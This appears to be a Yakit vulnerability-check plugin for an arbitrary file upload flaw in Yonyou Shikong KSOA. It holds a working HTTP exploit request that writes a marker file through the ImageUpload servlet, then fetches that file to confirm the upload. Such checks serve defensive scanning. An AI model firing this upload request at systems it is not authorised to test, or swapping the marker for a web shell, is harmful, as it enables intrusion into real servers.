# port scan plugin
# from 虚拟尽头
yakit.AutoInitYakit()

getCheck = func(addr){
    isTls = str.IsTLSServer(addr)
    packet = `GET /pictures/xnjt666.txt HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
`

    	rsp,req,_ = poc.HTTP(packet, 
    	poc.params({"target":addr}),
    	poc.https(isTls),
    	poc.redirectTimes(0),
    )
    // dump(rsp)
    	if len(rsp) > 0 {
        	if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`) && str.MatchAllOfSubString(rsp, `zifucxnjt666`){
            	return true
        }
    }
    return
}

handleCheck = func(addr){
    isTls = str.IsTLSServer(addr)
    packet = `POST /servlet/com.sksoft.bill.ImageUpload?filename=xnjt666.txt&filepath=/ HTTP/1.1
Host: {{params(target)}}
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D7B9314CC6B287CBD4D4F700211212E3
Connection: close
Content-Length: 7

{{params(zifuc)}}
`

    	rsp,req,_ = poc.HTTP(packet, 
    	poc.params({"target":addr,"zifuc":"zifucxnjt666"}),
    	poc.https(isTls),
    	poc.redirectTimes(0),
    )
    // dump(rsp)
    	if len(rsp) > 0 {
        	if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`) && str.MatchAllOfSubString(rsp, `/pictures/xnjt666.txt`){
                if getCheck(addr)==true{
                    risk.NewRisk(
                        target, risk.severity("high"), 
                        risk.title(f"用友时空KSOA ImageUpload 任意文件上传漏洞"),
                        risk.type("文件上传"),
                        risk.request(req),
                        risk.response(rsp),
                        risk.details({
                            "packet":string(packet),
                            "payload":"/pictures/xnjt666.txt",
                            }
                        ),
                    )
                }
        }
    }
    return
}

target = cli.String("root_url")
ip, port, _ = str.ParseStringToHostPort(target)
addr = str.HostPort(ip, port)
handleCheck(addr)
